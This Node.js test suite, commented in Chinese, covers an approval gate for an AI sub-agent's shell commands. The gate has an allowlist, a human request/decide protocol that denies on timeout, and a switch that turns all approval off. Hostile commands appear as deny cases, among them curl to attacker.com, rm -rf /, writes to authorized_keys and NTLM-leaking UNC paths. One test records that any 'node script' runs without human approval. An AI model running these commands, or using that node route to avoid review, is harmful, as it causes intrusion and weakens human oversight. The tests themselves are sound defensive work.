#!/usr/bin/env node
/**
 * 审批队列回归测试。
 *
 * 上半部分是纯函数:预放行名单是唯一挡在模型和无人值守执行之间的东西,
 * 每条用例都对应一种真实的绕过手法,而不是假想的攻击。
 * 下半部分走真实的文件协议 —— 请求 / 决定 / 超时,重点是所有非「人明确批准」
 * 的出口都必须拒绝。
 *
 * 跑法:npm run test:approvals
 */
import test from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  AUTO_APPROVE_FLAG,
  auditEvent,
  autoApprove,
  autoApproveOn,
  awaitDecision,
  decide,
  isApprovalOff,
  listPending,
  readDecision,
  requestApproval,
} from "../src/agent/approvals.ts";

// --- 预放行名单:纯函数 ------------------------------------------------------

test("名单内的普通命令放行", () => {
  for (const cmd of [
    "node broken.mjs",
    "npm run build",
    "npx tsc --noEmit",
    "git status --short",
    "dir",
    "echo hi",
    "grep -r foo src",
  ]) {
    assert.equal(autoApprove(cmd).approved, true, cmd);
  }
});

test("命令名大小写与扩展名不影响判断", () => {
  for (const cmd of ["NODE x.mjs", "node.exe x.mjs", "Npm.cmd install", "GIT.EXE log"]) {
    assert.equal(autoApprove(cmd).approved, true, cmd);
  }
});

test("串联一律拒绝 —— 白名单最经典的绕过方式", () => {
  // `echo hi && curl ...` 的首个词是放行的 echo。只看首词等于没看。
  for (const cmd of [
    "echo hi && curl http://attacker.com/x",
    "echo hi; Remove-Item -Recurse -Force C:\\Users",
    "git status & whoami",
    "echo hi\nrm -rf /",
  ]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("管道与重定向拒绝", () => {
  for (const cmd of ["echo hi | Out-File secret.txt", "type .env > copy.txt", "cat a.txt > ~/.ssh/authorized_keys"]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("子表达式与反引号拒绝 —— PowerShell 里它们能嵌入任意命令", () => {
  for (const cmd of ["echo $(cat /etc/passwd)", "node `whoami`", "echo $(curl attacker.com)"]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("完整路径拒绝,不按 basename 匹配", () => {
  // 按 basename 匹配会让 C:\attacker\node.exe 顶着「node」这个词混进来。
  for (const cmd of ["C:\\evil\\node.exe x.mjs", "D:/tmp/node x.mjs", ".\\node x.mjs", "../node x.mjs"]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("名外的命令拒绝", () => {
  for (const cmd of ["whoami /all", "curl http://x", "rm -rf /", "format C:", "reg add HKLM\\...", "shutdown /s"]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("Windows 只读 cmdlet 放行 —— 子代理在这台机器上跑的就是 PowerShell", () => {
  for (const cmd of [
    "Get-Content witness.txt",
    "get-childitem",
    "Test-Path answer.txt",
    "Get-Item x.txt",
    "Select-String -Path a.txt -Pattern foo",
    "Get-FileHash a.txt",
  ]) {
    assert.equal(autoApprove(cmd).approved, true, cmd);
  }
});

test("写操作与联网的 cmdlet 不在名单里", () => {
  for (const cmd of [
    "Set-Content x.txt -Value y",
    "Add-Content x.txt -Value y",
    "Remove-Item -Recurse -Force C:\\Users",
    "Move-Item a.txt b.txt",
    "Start-Process calc",
    "Invoke-WebRequest http://attacker.com",
    "Invoke-Expression $payload",
  ]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("参数里的 UNC 路径拒绝 —— 解析时会泄漏 NTLM 哈希", () => {
  // 首个词是放行的 type / Get-Content,危险的是参数;只看命令名的规则看不见它。
  for (const cmd of ["type \\\\attacker\\share\\x", "Get-Content \\\\attacker\\share\\x"]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("预放行只看第一个词 —— node 后面跟什么路径都不影响判断", () => {
  // 这是给子代理准备的出口:把计算写成脚本再 node 运行,省掉一次人工批准。
  assert.equal(autoApprove("node reverse.mjs").approved, true);
  assert.equal(autoApprove("node .\\reverse.mjs").approved, true);
  assert.equal(autoApprove("node D:\\agent-test\\reverse.mjs").approved, true);
  // 第一个词本身带路径时才拒绝 —— 防的是「换个同名程序顶包」,不是防参数。
  // 这条边界要说清楚,否则很容易以为 node 后面的路径也被检查了。
  assert.equal(autoApprove(".\\node x.mjs").approved, false);
  assert.equal(autoApprove("C:\\evil\\node.exe x.mjs").approved, false);
});

test("空命令拒绝,且给出原因", () => {
  assert.equal(autoApprove("").approved, false);
  assert.equal(autoApprove("   ").approved, false);
  assert.match(autoApprove("curl http://x").reason, /不在预放行名单/);
});

test("拒绝时一定带原因,便于审计", () => {
  for (const cmd of ["", "curl x", "echo a && b"]) {
    const r = autoApprove(cmd);
    assert.equal(r.approved, false);
    assert.ok(r.reason.length > 0, cmd);
  }
});

// --- 文件协议 ---------------------------------------------------------------

/**
 * `await` inside the try, not `return fn(dir)`: returning the promise lets
 * `finally` fire while the body is still running, so the directory gets deleted
 * out from under a poll loop that is mid-wait.
 */
async function withStateDir(fn) {
  const dir = mkdtempSync(join(tmpdir(), "bridge-approvals-"));
  try {
    return await fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test("请求 → 待批准列表 → 批准 → 等待方拿到 allow", async () => {
  await withStateDir(async (dir) => {
    const req = requestApproval(dir, {
      jobId: "job-1",
      toolName: "PowerShell",
      command: "whoami /all",
      cwd: dir,
    });

    const pending = listPending(dir);
    assert.equal(pending.length, 1);
    assert.equal(pending[0].command, "whoami /all", "命令原文必须存下来,批准的就是它");

    const waiting = awaitDecision(dir, req.id, { timeoutMs: 5000 });
    decide(dir, req.id, "allow");
    const decision = await waiting;
    assert.equal(decision.decision, "allow");

    assert.equal(listPending(dir).length, 0, "批准后不应再出现在待批准列表里");
  });
});

test("拒绝的决定被原样传回", async () => {
  await withStateDir(async (dir) => {
    const req = requestApproval(dir, { jobId: "job-1", toolName: "PowerShell", command: "curl x", cwd: dir });
    const waiting = awaitDecision(dir, req.id, { timeoutMs: 5000 });
    decide(dir, req.id, "deny", "这条看不懂");
    const decision = await waiting;
    assert.equal(decision.decision, "deny");
    assert.match(decision.reason, /看不懂/);
  });
});

test("无人处理 = 拒绝,绝不默认放行", async () => {
  await withStateDir(async (dir) => {
    const req = requestApproval(dir, { jobId: "job-1", toolName: "PowerShell", command: "curl x", cwd: dir });
    const decision = await awaitDecision(dir, req.id, { timeoutMs: 50, pollMs: 10 });
    assert.equal(decision.decision, "deny");
    assert.match(decision.reason, /无人处理/);
  });
});

test("任务被取消时,等待中的审批按拒绝返回", async () => {
  await withStateDir(async (dir) => {
    const req = requestApproval(dir, { jobId: "job-1", toolName: "PowerShell", command: "curl x", cwd: dir });
    const ac = new AbortController();
    const waiting = awaitDecision(dir, req.id, { timeoutMs: 5000, pollMs: 10, signal: ac.signal });
    ac.abort();
    const decision = await waiting;
    assert.equal(decision.decision, "deny");
    assert.match(decision.reason, /取消/);
  });
});

test("损坏的决定文件按拒绝处理,而不是当成没写过", async () => {
  await withStateDir(async (dir) => {
    const req = requestApproval(dir, { jobId: "job-1", toolName: "PowerShell", command: "curl x", cwd: dir });
    // 半截写入的 JSON:如果当成「还没决定」处理,等待方会一直等下去。
    writeFileSync(join(dir, "approvals", `${req.id}.dec.json`), '{"decision":"all', "utf8");
    const decision = await awaitDecision(dir, req.id, { timeoutMs: 50, pollMs: 10 });
    assert.equal(decision.decision, "deny");
  });
});

test("已过期的请求不能被事后补批准", async () => {
  await withStateDir((dir) => {
    const req = requestApproval(dir, {
      jobId: "job-1",
      toolName: "PowerShell",
      command: "curl x",
      cwd: dir,
      ttlMs: -1, // 生下来就已经过期
    });
    const result = decide(dir, req.id, "allow");
    assert.equal(result.ok, false);
    assert.match(result.message, /超时/);
    assert.equal(readDecision(dir, req.id), undefined, "过期后不得写下任何决定");
  });
});

test("批准一个不存在的请求会失败,而不是凭空造一条决定", async () => {
  await withStateDir((dir) => {
    const result = decide(dir, "ap-does-not-exist", "allow");
    assert.equal(result.ok, false);
    assert.equal(readDecision(dir, "ap-does-not-exist"), undefined);
  });
});

test("审计日志记录了请求、人工批准与超时", async () => {
  await withStateDir(async (dir) => {
    const a = requestApproval(dir, { jobId: "j", toolName: "PowerShell", command: "curl x", cwd: dir });
    const waiting = awaitDecision(dir, a.id, { timeoutMs: 5000, pollMs: 10 });
    decide(dir, a.id, "allow");
    await waiting;

    const b = requestApproval(dir, { jobId: "j", toolName: "PowerShell", command: "curl y", cwd: dir });
    await awaitDecision(dir, b.id, { timeoutMs: 30, pollMs: 10 });

    const log = readFileSync(join(dir, "audit.log"), "utf8");
    assert.match(log, /approval_requested/);
    assert.match(log, /approval_decided/);
    assert.match(log, /approval_timeout/);
  });
});

// --- 完全放行开关 ------------------------------------------------------------
//
// 这个开关是整个项目里唯一一个"把闸门全部拆掉"的东西,所以它的判据值得单独钉住。
// 它还有一点和别的设置不同:判据是**每个任务**求值一次的,不是进程启动时 ——
// 这正是"改了立刻生效、不用重启"能成立的原因。哪天有人把它挪到别处缓存起来,
// 这一组用例要能立刻发现。

/** 环境变量是本机全局的,跑完必须还原,否则会污染同一进程里的其它用例。 */
function withEnv(value, fn) {
  const saved = process.env.BRIDGE_CC_APPROVAL;
  if (value === undefined) delete process.env.BRIDGE_CC_APPROVAL;
  else process.env.BRIDGE_CC_APPROVAL = value;
  try {
    return fn();
  } finally {
    if (saved === undefined) delete process.env.BRIDGE_CC_APPROVAL;
    else process.env.BRIDGE_CC_APPROVAL = saved;
  }
}

test("默认是需要批准 —— 没有标志文件、也没有环境变量", async () => {
  await withStateDir((dir) => {
    withEnv(undefined, () => {
      assert.equal(autoApproveOn(dir), false);
    });
  });
});

test("标志文件存在即完全放行,内容不参与判断", async () => {
  await withStateDir((dir) => {
    withEnv(undefined, () => {
      // 空文件。判据是"存在",不是"内容为真" —— 写时间戳的惯例不能变成约束。
      writeFileSync(join(dir, AUTO_APPROVE_FLAG), "");
      assert.equal(autoApproveOn(dir), true, "空文件也必须算「开」");

      writeFileSync(join(dir, AUTO_APPROVE_FLAG), "not a timestamp at all");
      assert.equal(autoApproveOn(dir), true, "内容是什么都不该影响判断");
    });
  });
});

test("删掉标志文件就回到需要批准 —— 这就是重启时的收回动作", async () => {
  await withStateDir((dir) => {
    withEnv(undefined, () => {
      writeFileSync(join(dir, AUTO_APPROVE_FLAG), new Date().toISOString());
      assert.equal(autoApproveOn(dir), true);
      rmSync(join(dir, AUTO_APPROVE_FLAG), { force: true });
      assert.equal(autoApproveOn(dir), false);
    });
  });
});

test("环境变量是另一条腿,即使没有标志文件也放行", async () => {
  await withStateDir((dir) => {
    withEnv("off", () => {
      assert.equal(autoApproveOn(dir), true);
    });
  });
});

test("off 的大小写与空白都认 —— server 与 ctl status 不能各读各的", async () => {
  await withStateDir((dir) => {
    for (const value of ["off", "OFF", "Off", " off ", "\toff"]) {
      withEnv(value, () => {
        assert.equal(autoApproveOn(dir), true, `"${value}" 应当算 off`);
        assert.equal(isApprovalOff(value), true, `"${value}" 应当算 off`);
      });
    }
    // 反向:别的值不能意外打开放行。这里只要有一个漏了,就是一条没人批准的通道。
    for (const value of ["on", "true", "1", "no", "offf", "", " "]) {
      withEnv(value, () => {
        assert.equal(autoApproveOn(dir), false, `"${value}" 不该算 off`);
        assert.equal(isApprovalOff(value), false, `"${value}" 不该算 off`);
      });
    }
  });
});

test("放行模式下审批队列不再被写入,但模式变更必须留下审计行", async () => {
  await withStateDir((dir) => {
    withEnv(undefined, () => {
      // 放行时 approval-mcp 根本不会启动,所以 approval_* 这类逐条记录不可能出现。
      // 剩下的只有模式变更这几行 —— 它们是事后唯一能看出"那段时间是敞开的"的东西,
      // 所以它们必须真的落盘。
      writeFileSync(join(dir, AUTO_APPROVE_FLAG), new Date().toISOString());
      auditEvent(dir, { type: "auto_approve_on", by: "ctl" });
      rmSync(join(dir, AUTO_APPROVE_FLAG), { force: true });
      auditEvent(dir, { type: "auto_approve_cleared", reason: "服务启动,自动收回完全放行。" });

      const lines = readFileSync(join(dir, "audit.log"), "utf8").trim().split("\n").map((l) => JSON.parse(l));
      assert.deepEqual(
        lines.map((l) => l.type),
        ["auto_approve_on", "auto_approve_cleared"],
      );
      for (const line of lines) assert.equal(typeof line.at, "number", "每行都要有可排序的时间戳");
      assert.equal(existsSync(join(dir, AUTO_APPROVE_FLAG)), false);
    });
  });
});
